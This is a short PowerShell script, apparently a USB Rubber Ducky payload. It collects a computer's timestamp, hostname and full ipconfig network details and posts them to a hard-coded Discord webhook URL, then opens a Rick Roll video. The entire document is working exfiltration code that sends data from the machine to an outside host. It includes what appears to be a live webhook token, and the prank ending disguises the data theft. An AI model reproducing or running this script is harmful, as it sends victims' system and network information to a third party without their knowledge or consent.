
# set vars
$webhook_url = "https://discord.com/api/webhooks/1338311634757746750/Qi7ydqNIEvqJ_Zbbrv-N4Ekj7HGo7vRfUm7Q14Buccb0G5Bf4TbUwShrylHZHCZ3lVL-"
$headers = @{"Content-Type" = "application/json"}

# set payload commands
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$hostname = hostname
$ipconfig = ipconfig | Out-String | ConvertTo-Json -Compress

# post data
$data = @{
    "embeds" = @(@{
        "title" = "rubber ducky";
        "description" = 
            "timestamp: :" + $timestamp,
            "hostname: " + $hostname,
            "ipconfig: " + $ipconfig

    })
}

# convert post data to json
$json = $data | ConvertTo-Json -Depth 10

# Make the POST request
try {
    $response = Invoke-RestMethod -Uri $webhook_url -Method Post -Headers $headers -Body $json
    # output the raw content:
    Write-Host $response
}
catch {
    # Write-Error "Error: $($_.Exception.Message)"
    # You can also access the full error details:
    $_.Exception | Format-List *
}

# finish with rick roll
start-process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'